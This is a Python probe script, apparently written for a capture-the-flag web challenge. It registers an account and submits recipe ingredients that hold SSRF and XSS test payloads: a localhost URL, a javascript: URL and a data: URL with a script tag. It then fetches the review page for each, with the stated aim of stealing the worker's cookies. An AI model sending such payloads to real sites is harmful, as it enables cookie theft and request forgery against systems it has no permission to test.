#!/usr/bin/env python3
"""Test if the worker's 'fabrication mixer' loads content from ingredients URLs.

The challenge says: "Every recipe is loaded straight into the fabrication mixer for a full inspection."
This could mean: GET /review/:id triggers the worker to fetch ingredient data FROM URLS in my batch.

If so, I could craft ingredients with url-like names/values that trigger the worker to fetch
my controlled endpoint, potentially leaking its cookies or executing code.
"""
import sys,time;sys.path.insert(0,'.')
from cc import Client
BASE="https://tomorrow.web.2026.sunshinectf.games"
def log(*a):sys.stdout.buffer.write((" ".join(str(x) for x in a)+"\n").encode("utf-8","replace"));sys.stdout.flush()

# Test 1: Ingredients with http:// urls
log("=== Testing SSRF via URL-like ingredient values ===")
c=Client()
code,out,_=c.post("/register",{"username":"ssrf%d"%(int(time.time())%10000),"password":"Passw0rd!"})
u=out["user"]
log("User:",u)

# Try ingredients that look like they could be fetched
test_cases = [
    ("http-url-value", [{"name":"flour","value":"http://localhost:8000/feed"}]),
    ("javascript-injection", [{"name":"js","value":"javascript:alert(1)"}]),
    ("base64-payload", [{"name":"payload","value":"data:text/html,<script>alert(1)</script>"}]),
]

for tag,ings in test_cases:
    code,out,_=c.post("/api/recipe",{"title":tag,"ingredients":ings})
    rid=out.get("id")
    if rid:
        log(f"{tag}: created {rid}")
        # Now review it and see what happens
        try:
            page=c.get(f"/review/{rid}")[1]
            log(f"  Page length: {len(page) if isinstance(page,str) else 'N/A'}")
        except Exception as e:
            log(f"  Error reviewing: {e}")
        time.sleep(2)

log("\nDone SSRF probe - no obvious SSRF triggered yet")
